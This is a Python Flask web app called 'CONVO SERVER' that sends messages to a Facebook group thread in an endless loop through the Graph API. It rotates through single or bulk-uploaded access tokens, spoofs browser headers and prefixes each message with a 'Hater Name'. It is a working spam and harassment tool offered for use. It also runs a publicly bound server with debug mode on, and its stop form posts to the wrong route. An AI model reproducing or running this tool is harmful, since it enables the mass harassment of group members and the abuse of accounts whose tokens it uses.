from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message Sent Successfully From token {access_token}: {message}")
                else:
                    print(f"Message Sent Failed From token {access_token}: {message}")
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')

        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'Task started with ID: {task_id}'

    return render_template_string('''
           <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CONVO SERVER</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@300;400;500;700;900&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary: #ff8c00;
            /* Dark Orange */
            --primary-dark: #e67300;
            --secondary: #ff6600;
            /* Bright Orange */
            --accent: #00d4ff;
            /* Bright Blue */
            --dark: #0a0a0f;
            --dark-secondary: #1a1a24;
            --dark-tertiary: #2a2a3a;
            --glass: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.1);
            --success: #00ff88;
            --warning: #ffaa00;
            --error: #ff4444;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, var(--dark) 0%, var(--dark-secondary) 50%, var(--dark-tertiary) 100%);
            color: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: relative;
            min-height: 100vh;
            padding: 20px;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 20% 50%, rgba(255, 36, 0, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(0, 212, 255, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 40% 80%, rgba(255, 7, 58, 0.1) 0%, transparent 50%);
            pointer-events: none;
            z-index: 0;
        }

        body::after {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: repeating-linear-gradient(0deg, transparent, transparent 19px, rgba(255, 255, 255, 0.03) 20px),
                repeating-linear-gradient(90deg, transparent, transparent 19px, rgba(255, 255, 255, 0.03) 20px);
            background-size: 20px 20px;
            pointer-events: none;
            z-index: 0;
            opacity: 0.8;
        }

        .floating-particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
            overflow: hidden;
        }

        .particle {
            position: absolute;
            border-radius: 50%;
            animation: float 10s ease-in-out infinite, fadeInOut 10s ease-in-out infinite, colorChange 6s infinite alternate;
            opacity: 0;
        }

        @keyframes colorChange {
            0% {
                background-color: var(--accent);
                box-shadow: 0 0 8px var(--accent);
            }

            50% {
                background-color: var(--primary);
                box-shadow: 0 0 8px var(--primary);
            }

            100% {
                background-color: var(--accent);
                box-shadow: 0 0 8px var(--accent);
            }
        }

        @keyframes float {

            0%,
            100% {
                transform: translate(0, 0) rotate(0deg);
            }

            25% {
                transform: translate(10vw, 5vh) rotate(90deg);
            }

            50% {
                transform: translate(0, 10vh) rotate(180deg);
            }

            75% {
                transform: translate(-10vw, 5vh) rotate(270deg);
            }
        }

        @keyframes fadeInOut {

            0%,
            100% {
                opacity: 0;
                transform: scale(0.5);
            }

            10% {
                opacity: 1;
                transform: scale(1);
            }

            90% {
                opacity: 1;
            }

            95% {
                opacity: 0.5;
            }
        }

        .container {
            background: var(--glass);
            backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3),
                inset 0 1px 0 rgba(255, 255, 255, 0.1);
            width: 100%;
            max-width: 600px;
            position: relative;
            z-index: 10;
            animation: slideUp 0.8s ease-out forwards;
            opacity: 0;
            margin: 20px auto;
            flex-shrink: 0;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(50px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--primary), var(--secondary), var(--accent), transparent);
            border-radius: 20px 20px 0 0;
            animation: shimmer 3s ease-in-out infinite;
        }

        @keyframes shimmer {

            0%,
            100% {
                opacity: 0.5;
            }

            50% {
                opacity: 1;
            }
        }

        h1,
        h2 {
            font-family: 'Orbitron', sans-serif;
            color: var(--primary);
            text-align: center;
            margin-bottom: 20px;
            text-shadow: 0 0 20px rgba(255, 140, 0, 0.5);
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2px;
            position: relative;
        }

        h1 {
            font-size: 2.3em;
        }

        h2 {
            font-size: 1.5em;
            color: var(--accent);
            margin-bottom: 30px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: var(--accent);
            font-weight: 600;
            text-transform: uppercase;
            font-size: 0.85em;
            letter-spacing: 1px;
            font-family: 'Orbitron', sans-serif;
            display: flex;
            align-items: center;
        }

        .label-status {
            margin-bottom: 2px;
            font-weight: 600;
            font-size: 0.85em;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-family: 'Orbitron', sans-serif;
            display: flex;
            color: var(--accent);
            margin-top: 25px;
        }

        .label-status i {
            margin-right: 8px;
        }

        .input-container {
            position: relative;
            margin-bottom: 25px;
        }

        input[type="text"],
        input[type="number"],
        input[type="file"],
        select {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            background: rgba(0, 0, 0, 0.2);
            color: white;
            font-family: 'Inter', sans-serif;
            font-size: 1em;
            transition: all 0.3s ease;
            backdrop-filter: blur(10px);
            position: relative;
            z-index: 1;
        }

        input:focus,
        select:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(255, 140, 0, 0.1),
                0 0 20px rgba(255, 140, 0, 0.2);
            background: rgba(255, 140, 0, 0.05);
            transform: translateY(-2px);
        }

        input::placeholder {
            color: rgba(255, 255, 255, 0.4);
        }

        button {
            width: 100%;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            padding: 15px 20px;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s ease;
            box-shadow: 0 8px 25px rgba(255, 140, 0, 0.3),
                inset 0 1px 0 rgba(255, 255, 255, 0.1);
            font-family: 'Orbitron', sans-serif;
            font-size: 0.95em;
            margin-top: 15px;
            position: relative;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        button.btn-danger {
            background: linear-gradient(135deg, var(--error), #cc3333);
            box-shadow: 0 8px 25px rgba(255, 68, 68, 0.3);
        }

        button.btn-danger:hover {
            background: linear-gradient(135deg, #cc3333, var(--error));
            box-shadow: 0 12px 35px rgba(255, 68, 68, 0.4);
        }

        button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s ease;
            z-index: 2;
        }

        button:hover::before {
            left: 100%;
        }

        button:hover {
            transform: translateY(-3px);
        }

        button:active {
            transform: translateY(-1px);
        }

        .button-icon {
            margin-right: 10px;
        }

        .status-box {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid var(--glass-border);
            border-radius: 12px;
            padding: 15px;
            margin-top: 20px;
            margin-bottom: 20px;
            color: var(--success);
            text-align: center;
            font-weight: 600;
            font-family: 'Orbitron', sans-serif;
            letter-spacing: 1px;
            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
            min-height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: copy; /* Indicate it's clickable */
            user-select: all; /* Allow easy selection of text */
        }

        .status-box.error {
            color: var(--error);
            text-shadow: 0 0 10px rgba(255, 68, 68, 0.5);
        }

        .status-box.warning {
            color: var(--warning);
            text-shadow: 0 0 10px rgba(255, 170, 0, 0.5);
        }

        .footer {
            text-align: center;
            margin-top: 40px;
            color: rgba(255, 255, 255, 0.4);
            font-size: 0.7em;
            letter-spacing: 1px;
            font-family: 'Orbitron', sans-serif;
            text-transform: uppercase;
            transition: color 0.3s ease;
        }

        .footer::before {
            content: '';
            display: block;
            width: 80px;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            margin: 20px auto;
        }

        .footer:hover {
            color: var(--accent);
            text-shadow: 0 0 5px var(--accent);
        }

        .whatsapp-link,
        .facebook-link {
            display: inline-flex;
            align-items: center;
            color: var(--accent);
            text-decoration: none;
            margin: 10px 15px;
            font-family: 'Inter', sans-serif;
            font-weight: 500;
            transition: color 0.3s ease, transform 0.3s ease;
        }

        .whatsapp-link:hover,
        .facebook-link:hover {
            color: var(--primary);
            transform: translateY(-2px);
        }

        .whatsapp-link i,
        .facebook-link i {
            margin-right: 8px;
            font-size: 1.2em;
        }

        .logout-button {
            background: none;
            border: 3px solid;
            color: var(--accent);
            padding: 10px 20px;
            border-radius: 12px;
            width: 100%;
            text-decoration: none;
            margin-top: 25px;
            transition: all 0.3s ease;
            font-family: 'Orbitron', sans-serif;
            font-weight: 600;
            letter-spacing: 1px;
            font-size: 0.9em;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }

        .logout-button:hover {
            background: none;
            box-shadow: 0 5px 15px rgba(0, 212, 255, 0.2);
            color: var(--primary);
            transform: translateY(-2px);
        }

        .logout-button i {
            margin-right: 8px;
        }

        .token-option-buttons {
            display: flex;
            gap: 10px;
            margin-bottom: 25px;
        }

        .token-option-buttons button {
            flex: 1;
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: white;
            padding: 12px 15px;
            border-radius: 12px;
            cursor: pointer;
            font-family: 'Inter', sans-serif;
            font-size: 1em;
            transition: all 0.3s ease;
            box-shadow: none;
            margin-top: 0; /* Override default button margin */
        }

        .token-option-buttons button.active {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(255, 140, 0, 0.1), 0 0 20px rgba(255, 140, 0, 0.2);
        }

        .token-option-buttons button:hover:not(.active) {
            border-color: var(--accent);
            background: rgba(0, 0, 0, 0.4);
        }


        @media (max-width: 768px) {
            body {
                padding: 20px 10px;
            }

            .container {
                padding: 20px;
            }

            h1 {
                font-size: 2em;
            }

            h2 {
                font-size: 1.2em;
            }
        }

        .ripple-effect {
            position: absolute;
            border-radius: 50%;
            transform: scale(0);
            animation: ripple 0.6s linear;
            background-color: rgba(255, 255, 255, 0.7);
        }

        @keyframes ripple {
            to {
                transform: scale(4);
                opacity: 0;
            }
        }
    </style>
</head>

<body>
    <div class="floating-particles" id="particle-container"></div>

    <div class="container">
        <h1>CONVO <span style="color: var(--accent)">SERVER</span></h1>
        <form method="post" enctype="multipart/form-data" onsubmit="showStartingMessage()">
            <div class="input-container">
                <label><i class="fas fa-key button-icon"></i> Choose Token Option</label>
                <div class="token-option-buttons">
                    <button type="button" id="singleTokenBtn" onclick="toggleTokenInput('single')" class="active">Single Token</button>
                    <button type="button" id="multipleTokenBtn" onclick="toggleTokenInput('multiple')">Token File</button>
                </div>
                <input type="hidden" id="tokenOption" name="tokenOption" value="single">
            </div>
            <div class="input-container" id="singleTokenInput">
                <label for="singleToken"><i class="fas fa-clipboard button-icon"></i> Input Single Access Token</label>
                <input type="text" id="singleToken" name="singleToken" placeholder="PASTE YOUR TOKEN HERE">
            </div>
            <div class="input-container" id="tokenFileInput" style="display: none;">
                <label for="tokenFile"><i class="fas fa-file-upload button-icon"></i> Choose Token File</label>
                <input type="file" id="tokenFile" name="tokenFile">
            </div>
            <div class="input-container">
                <label for="threadId"><i class="fas fa-users button-icon"></i> Enter Group UID</label>
                <input type="text" id="threadId" name="threadId" placeholder="E.G., 24310969415154897" required>
            </div>
            <div class="input-container">
                <label for="kidx"><i class="fas fa-user-ninja button-icon"></i> Input Hater Name</label>
                <input type="text" id="kidx" name="kidx" placeholder="E.G., TESTING" required>
            </div>
            <div class="input-container">
                <label for="time"><i class="fas fa-clock button-icon"></i> Time Interval (Seconds)</label>
                <input type="number" id="time" name="time" placeholder="E.G., 10" min="1" required>
            </div>
            <div class="input-container">
                <label for="txtFile"><i class="fas fa-file-alt button-icon"></i> Select Messages TXT File</label>
                <input type="file" id="txtFile" name="txtFile" required>
            </div>
            <button type="submit" name="action" value="run_convo">
                <i class="fas fa-play button-icon"></i> START
            </button>
        </form>
        <label class="label-status"><i class="fas fa-info-circle"></i> STATUS BOX</label>
        <div class="status-box" id="statusMessage">
            Welcome to the Serverx Inc 
        </div>

        <form method="post" action="/" onsubmit="showStoppingMessage()">
            <div class="input-container">
                <label for="taskId"><i class="fas fa-stop-circle button-icon"></i> Input Task ID to Stop</label>
                <input type="text" id="taskId" name="taskId" placeholder="ENTER TASK ID" required>
            </div>
            <button type="submit" class="btn-danger" name="action" value="stop_convo">
                <i class="fas fa-stop button-icon"></i> STOP
            </button>
        </form>
        <a href="/logout" class="logout-button">
            <i class="fas fa-sign-out-alt"></i> LOGOUT
        </a>
        <footer class="footer">
            <p>© 2025 Serverx Inc All Rights Reserved.</span></p>
        </footer>
    </div>
    <script>
        function toggleTokenInput(option) {
            var singleTokenInput = document.getElementById('singleTokenInput');
            var tokenFileInput = document.getElementById('tokenFileInput');
            var singleToken = document.getElementById('singleToken');
            var tokenFile = document.getElementById('tokenFile');
            var tokenOptionHidden = document.getElementById('tokenOption');

            var singleTokenBtn = document.getElementById('singleTokenBtn');
            var multipleTokenBtn = document.getElementById('multipleTokenBtn');

            if (option === 'single') {
                singleTokenInput.style.display = 'block';
                tokenFileInput.style.display = 'none';
                singleToken.setAttribute('required', 'true');
                tokenFile.removeAttribute('required');
                tokenOptionHidden.value = 'single';

                singleTokenBtn.classList.add('active');
                multipleTokenBtn.classList.remove('active');
            } else {
                singleTokenInput.style.display = 'none';
                tokenFileInput.style.display = 'block';
                singleToken.removeAttribute('required');
                tokenFile.setAttribute('required', 'true');
                tokenOptionHidden.value = 'multiple';

                singleTokenBtn.classList.remove('active');
                multipleTokenBtn.classList.add('active');
            }
        }
        // Initialize on page load
        document.addEventListener('DOMContentLoaded', () => {
            toggleTokenInput('single'); // Set default to 'single' on load
        });

        // Particle generation script
        const particleContainer = document.getElementById('particle-container');
        const numParticles = 50;
        if (particleContainer) {
            for (let i = 0; i < numParticles; i++) {
                const particle = document.createElement('div');
                particle.classList.add('particle');
                const size = Math.random() * 3 + 2;
                particle.style.width = `${size}px`;
                particle.style.height = `${size}px`;
                particle.style.left = `${Math.random() * 100}%`;
                particle.style.top = `${Math.random() * 100}%`;
                particle.style.animationDelay = `${Math.random() * 10}s`;
                particle.style.animationDuration = `${Math.random() * 10 + 5}s`;
                particle.style.backgroundColor = 'var(--accent)';
                particle.style.boxShadow = `0 0 ${size * 2}px var(--accent)`;
                particle.style.animationDelay = `${Math.random() * 6}s, ${Math.random() * 10}s, ${Math.random() * 6}s`;
                particleContainer.appendChild(particle);
            }
        }

        // Ripple effect for buttons
        document.querySelectorAll('button').forEach(button => {
            button.addEventListener('click', function(e) {
                const ripple = document.createElement('span');
                ripple.classList.add('ripple-effect');
                this.appendChild(ripple);

                const rect = this.getBoundingClientRect();
                const size = Math.max(rect.width, rect.height);
                const x = e.clientX - rect.left - (size / 2);
                const y = e.clientY - rect.top - (size / 2);

                ripple.style.width = ripple.style.height = `${size}px`;
                ripple.style.left = `${x}px`;
                ripple.style.top = `${y}px`;

                ripple.addEventListener('animationend', () => {
                    ripple.remove();
                });
            });
        });

        function showStartingMessage() {
            document.getElementById('statusMessage').innerText = 'Starting... Please wait.';
            document.getElementById('statusMessage').classList.remove('error', 'warning');
            document.getElementById('statusMessage').classList.add('success');
        }

        function showStoppingMessage() {
            document.getElementById('statusMessage').innerText = 'Stopping... Please wait.';
            document.getElementById('statusMessage').classList.remove('error', 'success');
            document.getElementById('statusMessage').classList.add('warning');
        }

        // Make status box clickable to copy content
        document.getElementById('statusMessage').addEventListener('click', function() {
            const textToCopy = this.innerText.trim();
            if (textToCopy) {
                navigator.clipboard.writeText(textToCopy).then(() => {
                    const originalText = this.innerText;
                    this.innerText = 'Copied!';
                    this.classList.remove('success', 'error', 'warning');
                    this.classList.add('success'); // Flash green for success
                    setTimeout(() => {
                        this.innerText = originalText;
                        // Restore original class based on content if needed, or leave neutral
                        if (originalText.includes('Error')) {
                            this.classList.add('error');
                        } else if (originalText.includes('Stopping')) {
                            this.classList.add('warning');
                        } else {
                            this.classList.add('success');
                        }
                    }, 1500);
                }).catch(err => {
                    console.error('Failed to copy: ', err);
                    const originalText = this.innerText;
                    this.innerText = 'Copy Failed!';
                    this.classList.remove('success', 'warning');
                    this.classList.add('error');
                    setTimeout(() => {
                        this.innerText = originalText;
                         if (originalText.includes('Error')) {
                            this.classList.add('error');
                        } else if (originalText.includes('Stopping')) {
                            this.classList.add('warning');
                        } else {
                            this.classList.add('success');
                        }
                    }, 1500);
                });
            }
        });
    </script>
</body>

</html>''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    
